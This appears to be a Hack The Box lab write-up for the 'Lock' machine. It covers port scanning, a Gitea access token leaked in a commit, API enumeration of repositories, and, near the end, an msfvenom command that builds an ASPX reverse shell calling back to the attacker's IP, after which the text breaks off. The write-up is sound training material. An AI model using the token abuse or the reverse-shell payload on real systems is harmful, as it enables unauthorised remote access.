---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: 
---

<br />

![1](../../../assets/images/Lock/lock.png)

<br />

OS -> Windows.

Difficulty -> Easy.

<br />

# Introduction:

<br />



<br />

# Enumeration:

<br />

We start by running an `nmap` scan to identify the open ports and running services on the target machine:

<br />

```bash
❯ nmap -sCV -p80,445,3000,3389 10.129.29.102 -oN targeted
Nmap scan report for 10.129.29.102
Host is up (0.051s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Lock - Index
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=66679a5e766ff887; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=nL4-4QBSHlrhOkEdpYuT9_F7X0k6MTc2NzI2NjczNDIwNDA2NzYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 01 Jan 2026 11:25:34 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=ff1322dcbf548bb5; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=ib-UDhH_Y-lWSFpCTAieEhDy5oo6MTc2NzI2NjczOTUxMDc0MTcwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 01 Jan 2026 11:25:39 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-01T11:26:56+00:00
|_ssl-date: 2026-01-01T11:27:36+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2025-12-31T11:19:28
|_Not valid after:  2026-07-02T11:19:28
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=1/1%Time=695659AE%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(GetRequest,3000,"HTTP/1\.0\x20200\x20OK\r\nCache-Contro
SF:l:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCon
SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gite
SF:a=66679a5e766ff887;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cook
SF:ie:\x20_csrf=nL4-4QBSHlrhOkEdpYuT9_F7X0k6MTc2NzI2NjczNDIwNDA2NzYwMA;\x2
SF:0Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opti
SF:ons:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2001\x20Jan\x202026\x2011:25:34\x2
SF:0GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"them
SF:e-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=devi
SF:ce-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x2
SF:0cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:a
SF:pplication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRl
SF:YSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnR
SF:fdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi
SF:8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wb
SF:mciLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(HTTPOptions,1B1,"HTTP/1\.0\x20405\x20Met
SF:hod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20
SF:HEAD\r\nAllow:\x20GET\r\nCache-Control:\x20max-age=0,\x20private,\x20mu
SF:st-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_like_gitea=ff1322dcb
SF:f548bb5;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csr
SF:f=ib-UDhH_Y-lWSFpCTAieEhDy5oo6MTc2NzI2NjczOTUxMDc0MTcwMA;\x20Path=/;\x2
SF:0Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAM
SF:EORIGIN\r\nDate:\x20Thu,\x2001\x20Jan\x202026\x2011:25:39\x20GMT\r\nCon
SF:tent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-01T11:27:01
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan  1 12:27:37 2026 -- 1 IP address (1 host up) scanned in 130.69 seconds
```

<br />

# SMB - Port 445 

<br />

To begin enumerating the SMB service, we run a basic [NetExec](https://github.com/Pennyw0rth/NetExec) oneliner to gather some information about the Windows system that we're auditing:

<br />

```bash
❯ nxc smb 10.129.29.102
SMB         10.129.29.102   445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:None)
```

<br />

The output confirms the machine name and indicates that the target is running Windows Server 2022.

Anonymous access is not permitted:

<br />

```bash
❯ nxc smb 10.129.29.102 -u "" -p "" --shares
SMB         10.129.29.102   445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:None)
SMB         10.129.29.102   445    LOCK             [-] Lock\: STATUS_ACCESS_DENIED 
SMB         10.129.29.102   445    LOCK             [-] Error enumerating shares: Error occurs while reading from remote(104)
```

<br />

Without valid credentials, it makes no sense to continue listing this service.

<br />

# HTTP - Port 80

<br />

Port 80 is hosting a static IIS website:

<br />

![1](../../../assets/images/Lock/1.png)

<br />

No relevant information or interesting functionality is exposed, so we continue enumerating.

<br />

# HTTP - Port 3000

<br />

This port is hosting a `Gitea` instance:

<br />

![2](../../../assets/images/Lock/2.png)

<br />

In many cases, organizations expose public repositories, this instance is no exception.

By clicking on "Explore" we notice that there is a public repository:

<br />

![3](../../../assets/images/Lock/3.png)

<br />

Inside this repository, we can find a python script named `repos.py` and two commits:

<br />

![4](../../../assets/images/Lock/4.png)

<br />

The script functionality is very simple. It simply lists the repositories of the Gitea instance using its API.

<br />

```python
import requests
import sys
import os

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <gitea_domain>")
        sys.exit(1)

    gitea_domain = format_domain(sys.argv[1])

    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
    if not personal_access_token:
        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
        sys.exit(1)

    try:
        repos = get_repositories(personal_access_token, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

<br />

## Information disclosure - Gitea access token 

<br />

To run the script, we need a valid Gitea access token:

<br />

```bash
❯ python3 repos.py http://10.129.29.102:3000
Error: GITEA_ACCESS_TOKEN environment variable not set.
```

<br />

By reviewing the two above commits, we can discover the token we need:

<br />

![5](../../../assets/images/Lock/5.png)

<br />

To use it with the script, we export the environment variable and run it again:

<br />

```bash
❯ export GITEA_ACCESS_TOKEN="43ce39bb0bd6bc489284f2905f033ca467a6362f"
❯ python3 repos.py http://10.129.29.102:3000
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```

<br />

There is another repo named "website".

We can continue enumerating using curl with the access token inside an `Authorization` HTTP header.

<br />

```bash
❯ curl http://10.129.29.102:3000/api/v1/user/repos -H "Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f" -s | jq
[
  {
    "id": 1,
    "owner": {
      "id": 2,
      "login": "ellen.freeman",
      "login_name": "",
      "full_name": "",
      "email": "ellen.freeman@lock.vl",
      "avatar_url": "http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74",
      "language": "",
      "is_admin": false,
      "last_login": "0001-01-01T00:00:00Z",
      "created": "2023-12-27T11:13:10-08:00",
      "restricted": false,
      "active": false,
      "prohibit_login": false,
      "location": "",
      "website": "",
      "description": "",
      "visibility": "public",
      "followers_count": 0,
      "following_count": 0,
      "starred_repos_count": 0,
      "username": "ellen.freeman"
    },
    "name": "dev-scripts",
    "full_name": "ellen.freeman/dev-scripts",
    "description": "",
    "empty": false,
    "private": false,
    "fork": false,
    "template": false,
    "parent": null,
    "mirror": false,
    "size": 29,
    "language": "Python",
    "languages_url": "http://localhost:3000/api/v1/repos/ellen.freeman/dev-scripts/languages",
    "html_url": "http://localhost:3000/ellen.freeman/dev-scripts",
    "url": "http://localhost:3000/api/v1/repos/ellen.freeman/dev-scripts",
    "link": "",
    "ssh_url": "ellen.freeman@localhost:ellen.freeman/dev-scripts.git",
    "clone_url": "http://localhost:3000/ellen.freeman/dev-scripts.git",
    "original_url": "",
    "website": "",
    "stars_count": 0,
    "forks_count": 0,
    "watchers_count": 1,
    "open_issues_count": 0,
    "open_pr_counter": 0,
    "release_counter": 0,
    "default_branch": "main",
    "archived": false,
    "created_at": "2023-12-27T11:17:47-08:00",
    "updated_at": "2023-12-27T11:36:42-08:00",
    "archived_at": "1969-12-31T16:00:00-08:00",
    "permissions": {
      "admin": true,
      "push": true,
      "pull": true
    },
    "has_issues": true,
    "internal_tracker": {
      "enable_time_tracker": true,
      "allow_only_contributors_to_track_time": true,
      "enable_issue_dependencies": true
    },
    "has_wiki": true,
    "has_pull_requests": true,
    "has_projects": true,
    "has_releases": true,
    "has_packages": true,
    "has_actions": false,
    "ignore_whitespace_conflicts": false,
    "allow_merge_commits": true,
    "allow_rebase": true,
    "allow_rebase_explicit": true,
    "allow_squash_merge": true,
    "allow_rebase_update": true,
    "default_delete_branch_after_merge": false,
    "default_merge_style": "merge",
    "default_allow_maintainer_edit": false,
    "avatar_url": "",
    "internal": false,
    "mirror_interval": "",
    "mirror_updated": "0001-01-01T00:00:00Z",
    "repo_transfer": null
  },
  {
    "id": 5,
    "owner": {
      "id": 2,
      "login": "ellen.freeman",
      "login_name": "",
      "full_name": "",
      "email": "ellen.freeman@lock.vl",
      "avatar_url": "http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74",
      "language": "",
      "is_admin": false,
      "last_login": "0001-01-01T00:00:00Z",
      "created": "2023-12-27T11:13:10-08:00",
      "restricted": false,
      "active": false,
      "prohibit_login": false,
      "location": "",
      "website": "",
      "description": "",
      "visibility": "public",
      "followers_count": 0,
      "following_count": 0,
      "starred_repos_count": 0,
      "username": "ellen.freeman"
    },
    "name": "website",
    "full_name": "ellen.freeman/website",
    "description": "",
    "empty": false,
    "private": true,
    "fork": false,
    "template": false,
    "parent": null,
    "mirror": false,
    "size": 7370,
    "language": "CSS",
    "languages_url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/languages",
    "html_url": "http://localhost:3000/ellen.freeman/website",
    "url": "http://localhost:3000/api/v1/repos/ellen.freeman/website",
    "link": "",
    "ssh_url": "ellen.freeman@localhost:ellen.freeman/website.git",
    "clone_url": "http://localhost:3000/ellen.freeman/website.git",
    "original_url": "",
    "website": "",
    "stars_count": 0,
    "forks_count": 0,
    "watchers_count": 1,
    "open_issues_count": 0,
    "open_pr_counter": 0,
    "release_counter": 0,
    "default_branch": "main",
    "archived": false,
    "created_at": "2023-12-27T12:04:52-08:00",
    "updated_at": "2024-01-18T10:17:46-08:00",
    "archived_at": "1969-12-31T16:00:00-08:00",
    "permissions": {
      "admin": true,
      "push": true,
      "pull": true
    },
    "has_issues": true,
    "internal_tracker": {
      "enable_time_tracker": true,
      "allow_only_contributors_to_track_time": true,
      "enable_issue_dependencies": true
    },
    "has_wiki": true,
    "has_pull_requests": true,
    "has_projects": true,
    "has_releases": true,
    "has_packages": true,
    "has_actions": false,
    "ignore_whitespace_conflicts": false,
    "allow_merge_commits": true,
    "allow_rebase": true,
    "allow_rebase_explicit": true,
    "allow_squash_merge": true,
    "allow_rebase_update": true,
    "default_delete_branch_after_merge": false,
    "default_merge_style": "merge",
    "default_allow_maintainer_edit": false,
    "avatar_url": "",
    "internal": false,
    "mirror_interval": "",
    "mirror_updated": "0001-01-01T00:00:00Z",
    "repo_transfer": null
  }
]
```

<br />

We should list the available API functionalities by navigating to the `/api/swagger` default Gitea endpoint:

<br />

![6](../../../assets/images/Lock/6.png)

<br />

Among other, there is a really interesting functionality to list the content of a repository:

<br />

![7](../../../assets/images/Lock/7.png)

<br />

Based on this function, we proceed to list the content of the `website` repo:

<br />

```bash
❯ curl http://10.129.29.102:3000/api/v1/repos/ellen.freeman/website/contents -H "Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f" -s | jq -r ".[].name"
assets
changelog.txt
index.html
readme.md
```

<br />

If we list the content of the `index.html` file we confirm that it is the index of the website running on port 80.

<br />

```bash
❯ curl -s 'http://10.129.29.102:3000/api/v1/repos/ellen.freeman/website/contents/index.html' -H "Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f" | jq -r ".content" | base64 -d
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>Lock - Index</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="assets/img/favicon.png" rel="icon">
  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <!-- Template Main CSS File -->
  <link href="assets/css/style.css" rel="stylesheet">

  <!-- =======================================================
  * Template Name: Gp
  * Updated: Nov 25 2023 with Bootstrap v5.3.2
  * Template URL: https://bootstrapmade.com/gp-free-multipurpose-html-bootstrap-template/
  * Author: BootstrapMade.com
  * License: https://bootstrapmade.com/license/
  ======================================================== -->
</head>

<body>

  <!-- ======= Header ======= -->
  <header id="header" class="fixed-top ">
    <div class="container d-flex align-items-center justify-content-lg-between">

      <h1 class="logo me-auto me-lg-0"><a href="index.html">Gp<span>.</span></a></h1>
      <!-- Uncomment below if you prefer to use an image logo -->
      <!-- <a href="index.html" class="logo me-auto me-lg-0"><img src="assets/img/logo.png" alt="" class="img-fluid"></a>-->

      <nav id="navbar" class="navbar order-last order-lg-0">
        <ul>
          <li><a class="nav-link scrollto active" href="#hero">Home</a></li>
          <li><a class="nav-link scrollto" href="#about">About</a></li>
        <i class="bi bi-list mobile-nav-toggle"></i>
      </nav><!-- .navbar -->

      <a href="#about" class="get-started-btn scrollto">Get Started</a>

    </div>
  </header><!-- End Header -->

  <!-- ======= Hero Section ======= -->
<section id="hero" class="d-flex align-items-center justify-content-center">
  <div class="container" data-aos="fade-up">

    <div class="row justify-content-center" data-aos="fade-up" data-aos-delay="150">
      <div class="col-xl-6 col-lg-8">
        <h1>Powerful Document Solutions With Cutting-Edge Technology<span>.</span></h1>
      </div>
    </div>

    <div class="row gy-4 mt-5 justify-content-center" data-aos="zoom-in" data-aos-delay="250">
      <div class="col-xl-2 col-md-4">
        <div class="icon-box">
          <i class="ri-file-search-line"></i>
          <h3><a href="">PDF OCR</a></h3>
        </div>
      </div>
      <div class="col-xl-2 col-md-4">
        <div class="icon-box">
          <i class="ri-file-transfer-line"></i>
          <h3><a href="">PDF to Word</a></h3>
        </div>
      </div>
      <div class="col-xl-2 col-md-4">
        <div class="icon-box">
          <i class="ri-file-shield-2-line"></i>
          <h3><a href="">Redact PDF</a></h3>
        </div>
      </div>
      <div class="col-xl-2 col-md-4">
        <div class="icon-box">
          <i class="ri-water-flash-line"></i>
          <h3><a href="">PDF Watermark</a></h3>
        </div>      
      </div>
      <div class="col-xl-2 col-md-4">
        <div class="icon-box">
          <i class="ri-shield-keyhole-line"></i>
          <h3><a href="">PDF Protection</a></h3>
        </div>
      </div>
    </div>

  </div>
</section><!-- End Hero -->


  <main id="main">

   <!-- ======= About Section ======= -->
<section id="about" class="about">
  <div class="container" data-aos="fade-up">

    <div class="row">
      <div class="col-lg-6 order-1 order-lg-2" data-aos="fade-left" data-aos-delay="100">
        <img src="assets/img/about.jpg" class="img-fluid" alt="Team working on document management">
      </div>
      <div class="col-lg-6 pt-4 pt-lg-0 order-2 order-lg-1 content" data-aos="fade-right" data-aos-delay="100">
        <h3>Efficient and Secure Document Management Solutions</h3>
        <p class="fst-italic">
          At Lock, we specialize in providing cutting-edge PDF and document management solutions to streamline your workflow and secure your data.
        </p>
        <ul>
          <li><i class="ri-check-double-line"></i> Advanced PDF editing and conversion tools to enhance productivity.</li>
          <li><i class="ri-check-double-line"></i> Robust security features to protect sensitive information.</li>
          <li><i class="ri-check-double-line"></i> Customizable document management systems tailored to your specific needs.</li>
        </ul>
        <p>
          Our team of experts is dedicated to delivering user-friendly, innovative solutions that meet the evolving needs of businesses. From document archiving to real-time collaboration, we ensure your documents are managed efficiently and securely.
        </p>
      </div>
    </div>

  </div>
</section><!-- End About Section -->


    <!-- ======= Clients Section ======= -->
    <section id="clients" class="clients">
      <div class="container" data-aos="zoom-in">

        <div class="clients-slider swiper">
          <div class="swiper-wrapper align-items-center">
            <div class="swiper-slide"><img src="assets/img/clients/client-1.png" class="img-fluid" alt=""></div>
            <div class="swiper-slide"><img src="assets/img/clients/client-2.png" class="img-fluid" alt=""></div>
            <div class="swiper-slide"><img src="assets/img/clients/client-3.png" class="img-fluid" alt=""></div>
            <div class="swiper-slide"><img src="assets/img/clients/client-4.png" class="img-fluid" alt=""></div>
            <div class="swiper-slide"><img src="assets/img/clients/client-5.png" class="img-fluid" alt=""></div>
            <div class="swiper-slide"><img src="assets/img/clients/client-6.png" class="img-fluid" alt=""></div>
            <div class="swiper-slide"><img src="assets/img/clients/client-7.png" class="img-fluid" alt=""></div>
            <div class="swiper-slide"><img src="assets/img/clients/client-8.png" class="img-fluid" alt=""></div>
          </div>
          <div class="swiper-pagination"></div>
        </div>

      </div>
    </section><!-- End Clients Section -->

    <!-- ======= Features Section ======= -->
<section id="features" class="features">
  <div class="container" data-aos="fade-up">

    <div class="row">
      <div class="image col-lg-6" style='background-image: url("assets/img/features.jpg");' data-aos="fade-right"></div>
      <div class="col-lg-6" data-aos="fade-left" data-aos-delay="100">
        <div class="icon-box mt-5 mt-lg-0" data-aos="zoom-in" data-aos-delay="150">
          <i class="bx bx-layer"></i>
          <h4>PDF OCR</h4>
          <p>Efficiently convert scanned documents into editable and searchable text with our advanced Optical Character Recognition technology.</p>
        </div>
        <div class="icon-box mt-5" data-aos="zoom-in" data-aos-delay="150">
          <i class="bx bx-file"></i>
          <h4>PDF to Word</h4>
          <p>Seamlessly convert PDF documents into editable Word formats while maintaining the original layout and formatting.</p>
        </div>
        <div class="icon-box mt-5" data-aos="zoom-in" data-aos-delay="150">
          <i class="bx bx-hide"></i>
          <h4>Redact PDF</h4>
          <p>Secure sensitive information in your PDF documents with our reliable redaction tools, ensuring privacy and confidentiality.</p>
        </div>
        <div class="icon-box mt-5" data-aos="zoom-in" data-aos-delay="150">
          <i class="bx bx-water"></i>
          <h4>PDF Watermark</h4>
          <p>Add customized watermarks to your PDFs for branding or copyright protection, enhancing both security and professionalism.</p>
        </div>
        <div class="icon-box mt-5" data-aos="zoom-in" data-aos-delay="150">
          <i class="bx bx-lock"></i>
          <h4>PDF Protection</h4>
          <p>Ensure the integrity of your documents with robust PDF protection features, including password encryption and access restrictions.</p>
        </div>
        <div class="icon-box mt-5" data-aos="zoom-in" data-aos-delay="150">
          <i class="bx bx-pencil"></i>
          <h4>Sign PDF</h4>
          <p>Digitally sign PDF documents with ease, providing a secure and legal way to validate and authorize documents electronically.</p>
        </div>
      </div>
    </div>

  </div>
</section><!-- End Features Section -->



    <!-- ======= Counts Section ======= -->
<section id="counts" class="counts">
  <div class="container" data-aos="fade-up">

    <div class="row no-gutters">
      <div class="image col-xl-5 d-flex align-items-stretch justify-content-center justify-content-lg-start" data-aos="fade-right" data-aos-delay="100"></div>
      <div class="col-xl-7 ps-4 ps-lg-5 pe-4 pe-lg-1 d-flex align-items-stretch" data-aos="fade-left" data-aos-delay="100">
        <div class="content d-flex flex-column justify-content-center">
          <h3>Empowering Businesses with Efficient Document Solutions</h3>
          <p>
            Our commitment to excellence in PDF and document management has led to significant achievements. We take pride in our contributions to enhancing productivity and security in document handling.
          </p>
          <div class="row">
            <div class="col-md-6 d-md-flex align-items-md-stretch">
              <div class="count-box">
                <i class="bi bi-emoji-smile"></i>
                <span data-purecounter-start="0" data-purecounter-end="228" data-purecounter-duration="2" class="purecounter"></span>
                <p><strong>Happy Clients</strong> who trust our solutions for their document management needs.</p>
              </div>
            </div>

            <div class="col-md-6 d-md-flex align-items-md-stretch">
              <div class="count-box">
                <i class="bi bi-journal-richtext"></i>
                <span data-purecounter-start="0" data-purecounter-end="542" data-purecounter-duration="2" class="purecounter"></span>
                <p><strong>Projects Completed</strong> including PDF conversions, OCR, and document security enhancements.</p>
              </div>
            </div>

            <div class="col-md-6 d-md-flex align-items-md-stretch">
              <div class="count-box">
                <i class="bi bi-clock"></i>
                <span data-purecounter-start="0" data-purecounter-end="3" data-purecounter-duration="4" class="purecounter"></span>
                <p><strong>Years of Experience</strong> in delivering top-notch document management solutions.</p>
              </div>
            </div>

            <div class="col-md-6 d-md-flex align-items-md-stretch">
              <div class="count-box">
                <i class="bi bi-award"></i>
                <span data-purecounter-start="0" data-purecounter-end="2" data-purecounter-duration="4" class="purecounter"></span>
                <p><strong>Awards and Recognition</strong> received for innovation and excellence in document management.</p>
              </div>
            </div>
          </div>
        </div><!-- End .content-->
      </div>
    </div>

  </div>
</section><!-- End Counts Section -->


    <!-- ======= Testimonials Section ======= -->
<section id="testimonials" class="testimonials">
  <div class="container" data-aos="zoom-in">

    <div class="testimonials-slider swiper" data-aos="fade-up" data-aos-delay="100">
      <div class="swiper-wrapper">

        <div class="swiper-slide">
          <div class="testimonial-item">
            <img src="assets/img/testimonials/testimonials-1.jpg" class="testimonial-img" alt="">
            <h3>Saul Goodman</h3>
            <h4>Legal Consultant</h4>
            <p>
              <i class="bx bxs-quote-alt-left quote-icon-left"></i>
              "Using Lock's PDF OCR tool transformed how we handle case files. We can now quickly convert scanned documents into searchable formats, significantly enhancing our efficiency."
              <i class="bx bxs-quote-alt-right quote-icon-right"></i>
            </p>
          </div>
        </div><!-- End testimonial item -->

        <div class="swiper-slide">
          <div class="testimonial-item">
            <img src="assets/img/testimonials/testimonials-2.jpg" class="testimonial-img" alt="">
            <h3>Sara Wilsson</h3>
            <h4>Academic Researcher</h4>
            <p>
              <i class="bx bxs-quote-alt-left quote-icon-left"></i>
              "I regularly use Lock's PDF to Word conversion for my research. It's a game changer in terms of accessibility and editing capabilities for large volumes of data."
              <i class="bx bxs-quote-alt-right quote-icon-right"></i>
            </p>
          </div>
        </div><!-- End testimonial item -->

        <div class="swiper-slide">
          <div class="testimonial-item">
            <img src="assets/img/testimonials/testimonials-5.jpg" class="testimonial-img" alt="">
            <h3>John Larson</h3>
            <h4>Entrepreneur</h4>
            <p>
              <i class="bx bxs-quote-alt-left quote-icon-left"></i>
              "The Redact PDF feature from Lock has been instrumental in protecting our sensitive business information. It's easy to use and incredibly reliable."
              <i class="bx bxs-quote-alt-right quote-icon-right"></i>
            </p>
          </div>
        </div><!-- End testimonial item -->
      </div>
      <div class="swiper-pagination"></div>
    </div>

  </div>
</section><!-- End Testimonials Section -->


  </main><!-- End #main -->

  <!-- ======= Footer ======= -->
  <footer id="footer">
    <div class="footer-top">
    <div class="container">
      <div class="copyright">
        &copy; Copyright <strong><span>Gp</span></strong>. All Rights Reserved
      </div>
      <div class="credits">
        <!-- All the links in the footer should remain intact. -->
        <!-- You can delete the links only if you purchased the pro version. -->
        <!-- Licensing information: https://bootstrapmade.com/license/ -->
        <!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/gp-free-multipurpose-html-bootstrap-template/ -->
        Designed by <a href="https://bootstrapmade.com/">BootstrapMade</a>
      </div>
    </div>
  </footer><!-- End Footer -->

  <div id="preloader"></div>
  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>

  <!-- Vendor JS Files -->
  <script src="assets/vendor/purecounter/purecounter_vanilla.js"></script>
  <script src="assets/vendor/aos/aos.js"></script>
  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
  <script src="assets/vendor/php-email-form/validate.js"></script>

  <!-- Template Main JS File -->
  <script src="assets/js/main.js"></script>

</body>

</html>
```

<br />

## Reverse Shell Upload

<br />

At this point, something that we could try is to upload a malicious file such a ASPX reverse shell to the IIS website taking advantage from the Gitea access token.

To exploit this we will use the following API function to create a file in the repo `website`:

<br />

![8](../../../assets/images/Lock/8.png)

<br />

First, we create the ASPX reverse shell using `msfvenom`:

<br />

```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.253 LPORT=4444 -f aspx -o reverse.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3428 bytes
Saved as: reverse.aspx
```

<br />

Now, we copy the reverse shell content and base64-encode it:

<br />

```bash
❯ cat reverse.aspx | base64 -w 0 > reverse_b64
```

<br />

Finally, we insert the base64-encoded reverse shell inside the content file of our request:

<br />

```bash
